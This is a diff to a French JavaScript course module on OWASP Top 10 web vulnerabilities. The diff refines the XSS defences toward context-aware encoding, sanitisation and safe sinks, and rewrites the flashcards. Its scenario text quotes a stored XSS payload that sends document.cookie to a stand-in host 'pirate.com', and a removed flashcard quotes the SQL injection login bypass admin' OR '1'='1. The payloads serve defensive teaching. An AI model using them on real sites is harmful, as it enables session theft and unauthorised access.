@@ -20,7 +20,7 @@ module.exports = {
     'Plus loin, il poste un commentaire contenant <code>&lt;script&gt;fetch("http://pirate.com/?c=" + document.cookie)&lt;/script&gt;</code> ' +
     'qui vole la session de tous les clients consultant la fiche produit. ' +
     'Pourquoi ces failles applicatives continuent-elles de figurer en tête du classement OWASP depuis vingt ans ? ' +
-    'Comment éradiquer définitivement les injections et neutraliser les failles XSS à la source ? ' +
+    'Comment réduire les risques d’injection et de XSS avec des défenses adaptées au contexte ? ' +
     'Ce module détaille l’anatomie des vulnérabilités web et leurs parades logicielles.',
 
   objectives: [
@@ -95,11 +95,12 @@ module.exports = {
         '  </div>',
         '</div>',
 
-        box('info', 'Le bouclier à trois niveaux contre le XSS', [
+        box('info', 'Défense en profondeur contre le XSS', [
           '<ol>',
-          '  <li><strong>Échappement contextuel (Contextual Escaping) :</strong> Remplacer les entités HTML (<code>&amp;</code> &rarr; <code>&amp;amp;</code>, <code>&lt;</code> &rarr; <code>&amp;lt;</code>, <code>&gt;</code> &rarr; <code>&amp;gt;</code>, <code>"</code> &rarr; <code>&amp;quot;</code>, <code>\'</code> &rarr; <code>&amp;#x27;</code>).</li>',
-          '  <li><strong>Drapeaux de cookies sécurisés :</strong> Définir <code>HttpOnly</code> sur le cookie de session (le script pirate ne peut plus lire <code>document.cookie</code>) et <code>Secure</code> (transit HTTPS uniquement).</li>',
-          '  <li><strong>Politique de sécurité de contenu (CSP) :</strong> En-tête HTTP <code>Content-Security-Policy: default-src \'self\';</code> interdisant les scripts inline et domaines non autorisés.</li>',
+          '  <li><strong>Encodage adapté au contexte :</strong> Dans du texte HTML, encoder les caractères spéciaux ; dans un attribut HTML correctement cité, utiliser l’encodeur approprié. Pour une URL, valider le schéma et la destination autorisés, encoder les composants, puis l’attribut si nécessaire. Cet encodage HTML ne rend pas sûre une insertion dans du JavaScript, un gestionnaire d’événement ou une URL <code>javascript:</code>.</li>',
+          '  <li><strong>Récepteurs et HTML autorisé :</strong> Préférer <code>textContent</code> pour du texte dans un élément non exécutable. Si du HTML fourni par l’utilisateur est indispensable, employer un assainissement avec une bibliothèque maintenue et une politique adaptée ; l’encodage de texte et l’assainissement de HTML sont différents.</li>',
+          '  <li><strong>Drapeaux de cookies sécurisés :</strong> <code>HttpOnly</code> empêche la lecture du cookie par <code>document.cookie</code> et <code>Secure</code> limite son envoi à HTTPS ; ils n’empêchent pas un script injecté d’agir avec la session.</li>',
+          '  <li><strong>Politique de sécurité de contenu (CSP) :</strong> Une CSP restrictive réduit les possibilités d’exécution de scripts ; son efficacité dépend de ses directives et elle ne remplace pas les autres protections.</li>',
           '</ol>'
         ].join('\n'))
       ].join('\n')
@@ -187,7 +188,7 @@ module.exports = {
   methodTitle: 'Protocole en 4 étapes pour sécuriser les formulaires et APIs contre le Top 10 OWASP',
   method: [
     'Systématiser les requêtes préparées avec liaisons de paramètres typés pour chaque accès à la base de données relationnelle ou NoSQL.',
-    'Échapper contextuellement chaque variable réinjectée dans le DOM HTML selon son emplacement (HTML body, attribut, script, style).',
+    'Privilégier les récepteurs de texte sûrs ; adapter l’encodage aux contextes HTML et attribut, valider les URL et éviter l’insertion de données non fiables dans du code JavaScript ou CSS.',
     'Durcir les cookies de session : forcer systématiquement les drapeaux HttpOnly, Secure et SameSite=Lax (ou Strict).',
     'Intégrer un contrôle d’accès systématique par politique (ex. CanAccess(user, document_id)) avant toute opération de lecture ou d’écriture.'
   ],
@@ -195,14 +196,14 @@ module.exports = {
   summary: [
     'Le Top 10 OWASP classe les failles applicatives majeures, dominé par Broken Access Control et les Injections.',
     'Les requêtes préparées neutralisent les injections SQL en dissociant la compilation de la requête des données entrantes.',
-    'Les failles XSS (stockée, réfléchie, DOM) se contrent par l’échappement HTML, la directive CSP et l’attribut de cookie HttpOnly.',
+    'Les protections XSS associent récepteurs sûrs, encodage selon le contexte, assainissement si du HTML est autorisé et mesures complémentaires comme CSP et HttpOnly.',
     'Le CSRF usurpe l’action de l’utilisateur authentifié et se bloque avec des jetons anti-CSRF et SameSite.',
     'Les failles IDOR exigent un contrôle rigoureux de l’appartenance de l’objet demandé à l’utilisateur de la session courante.'
   ],
 
   checklist: [
     'Je sais identifier une concaténation SQL vulnérable et la réécrire avec des requêtes préparées.',
-    'Je connais la liste exacte des 5 caractères spéciaux HTML à échapper impérativement contre le XSS (&, <, >, ", \').',
+    'Je distingue les contextes texte HTML, attribut, URL et JavaScript, ainsi que l’encodage et l’assainissement de HTML.',
     'Je comprends le rôle des drapeaux HttpOnly, Secure et SameSite sur les cookies.',
     'Je sais expliquer le fonctionnement d’une attaque CSRF et le rôle du jeton de synchronisation.',
     'Je sais concevoir une vérification de droits pour interdire les accès non autorisés de type IDOR.'
@@ -229,15 +230,15 @@ module.exports = {
   ],
 
   flashcards: [
-    { "q": 'Qu’est-ce que « Référentiel OWASP Top 10 » ?', "a": "Référentiel OWASP Top 10 : Lors d’un test d’intrusion (pentest) sur une plateforme de commerce électronique, l’auditeur saisit admin' OR '1'='1 dans le formulaire de connexion et accède instantanément au tableau de bord administrateur sans mot de passe. Plus loin, il poste un commentaire contenant &lt;script&gt;" },
-    { "q": 'Qu’est-ce que « Cross-Site Scripting (XSS Stored, Reflected, DOM) » ?', "a": 'Cross-Site Scripting (XSS Stored, Reflected, DOM)' },
-    { "q": 'Qu’est-ce que « Échappement d’entités HTML » ?', "a": 'Échappement d’entités HTML' },
-    { "q": 'Qu’est-ce que « Attributs de cookies (HttpOnly, Secure, SameSite) » ?', "a": 'Attributs de cookies (HttpOnly, Secure, SameSite)' },
-    { "q": 'Qu’est-ce que « Politique de sécurité de contenu (CSP) » ?', "a": "Politique de sécurité de contenu (CSP) : En-tête HTTP Content-Security-Policy: default-src 'self'; interdisant les scripts inline et domaines non autorisés." },
-    { "q": 'Qu’est-ce que « Cross-Site Request Forgery (CSRF) » ?', "a": 'Cross-Site Request Forgery (CSRF)' },
+    { "q": 'Qu’est-ce que « Référentiel OWASP Top 10 » ?', "a": 'Liste de sensibilisation publiée par OWASP, qui recense dix catégories de risques majeurs pour les applications web.' },
+    { "q": 'Qu’est-ce que « Cross-Site Scripting (XSS Stored, Reflected, DOM) » ?', "a": 'Une XSS exécute du code injecté dans le navigateur : la charge peut être stockée ou réfléchie ; une XSS DOM implique un traitement dangereux côté client.' },
+    { "q": 'Qu’est-ce que « Échappement d’entités HTML » ?', "a": 'Encoder les caractères spéciaux pour que les données soient interprétées comme du texte plutôt que comme du HTML ; adapter l’encodage au contexte.' },
+    { "q": 'Qu’est-ce que « Attributs de cookies (HttpOnly, Secure, SameSite) » ?', "a": 'HttpOnly empêche la lecture du cookie par JavaScript ; Secure limite son envoi à HTTPS ; SameSite limite certains envois intersites.' },
+    { "q": 'Qu’est-ce que « Politique de sécurité de contenu (CSP) » ?', "a": 'En-tête qui indique au navigateur les sources de ressources et de scripts autorisées ; il réduit le risque XSS sans remplacer l’encodage.' },
+    { "q": 'Qu’est-ce que « Cross-Site Request Forgery (CSRF) » ?', "a": 'Une attaque CSRF fait envoyer une action non voulue par le navigateur authentifié de la victime ; un jeton anti-CSRF vérifié et SameSite la limitent.' },
     { q: 'Quelle est la cause fondamentale d’une vulnérabilité par injection SQL ?', a: 'La concaténation directe de données utilisateur non typées dans la commande SQL interprétée par la base de données.' },
     { q: 'Quelle est la seule contre-mesure définitive contre les injections SQL ?', a: 'L’utilisation systématique de requêtes préparées avec paramètres liés (Prepared Statements).' },
-    { q: 'Quels sont les 5 caractères à échapper pour neutraliser une injection XSS dans du code HTML ?', a: 'Le perluète (&), le chevron ouvrant (<), le chevron fermant (>), les guillemets droits (") et l’apostrophe (\').' },
+    { q: 'Pourquoi les défenses XSS dépendent-elles des contextes de sortie ?', a: 'Le texte HTML, un attribut cité et une URL exigent des traitements adaptés : valider aussi le schéma de l’URL. Éviter l’insertion directe dans JavaScript ; préférer textContent pour du texte et un assainissement adapté si du HTML est autorisé.' },
     { q: 'Quel est l’impact de l’attribut de cookie HttpOnly ?', a: 'Il interdit tout accès au cookie via le code JavaScript (document.cookie), bloquant le vol de session direct par XSS.' },
     { q: 'Comment une application web se protège-t-elle contre les attaques CSRF ?', a: 'En exigeant un jeton anti-CSRF secret et imprévisible avec chaque requête modifiante, et en activant SameSite=Lax sur les cookies.' },
     { q: 'Qu’est-ce qu’une faille IDOR (Insecure Direct Object Reference) ?', a: 'Une faille où un utilisateur accède à un document tiers simplement en changeant un identifiant dans l’URL sans contrôle d’autorisation.' }
